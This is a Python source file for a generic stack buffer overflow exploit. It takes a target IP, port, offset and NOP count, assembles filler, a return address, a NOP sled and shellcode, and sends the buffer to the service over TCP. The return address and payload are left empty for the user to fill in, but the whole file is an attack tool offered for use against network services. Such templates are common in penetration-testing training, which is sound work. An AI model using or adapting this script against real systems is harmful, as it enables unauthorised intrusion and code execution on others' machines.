import socket, sys, argparse
from colorama import Fore, init, Style
init()
info = f'{Fore.YELLOW + Style.BRIGHT}[!]{Fore.RESET + Style.RESET_ALL}'
success = f'{Fore.GREEN + Style.BRIGHT}[+]{Fore.RESET + Style.RESET_ALL}'
error = f'{Fore.RED + Style.BRIGHT}[-]{Fore.RESET + Style.RESET_ALL}'

def exploit(ip, port, offset, nop, prefix):
    overflow = prefix * offset
    padding = "\x90" * nop
    retrn = "" # return address is REQUIRED!
    payload = () # payload is REQUIRED!
    if not payload:
        print(f'{error} Please provide a payload by editing the script.')
        return
    if not retrn:
        print(f'{error} Please provide a return address by editing the script.')
        return

    buffer = overflow + retrn + padding + payload
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        print(f"{success} Sending buffer...")
        s.send(bytes(buffer + "\r\n", 'latin-1'))
        print(f"{success} Done!")
        s.close()
    except Exception as e:
        print(f"{error} Could not connect: {e}")
    except KeyboardInterrupt:
        print(f"{info} Interrupted by user.")
        return

def main():
    parser = argparse.ArgumentParser(description='Buffer Overflow exploit script.')
    parser.add_argument('ip', type=str, help='Target IP address')
    parser.add_argument('port', type=int, help='Target port number')
    parser.add_argument('-p', '--prefix', type=str, default='A', help='Prefix string (default: A)')
    parser.add_argument('-o', '--offset', type=int, required=True, help='Offset value')
    parser.add_argument('-n', '--nop', type=int, default=16, help='Padding NOPs (default: 16)')
    args = parser.parse_args()

    try:
        socket.inet_aton(args.ip)
    except socket.error:
        print(f'{error} Invalid IP address.')
        sys.exit(1)

    exploit(args.ip, args.port, args.offset, args.nop, args.prefix)
if __name__ == '__main__':
    main()
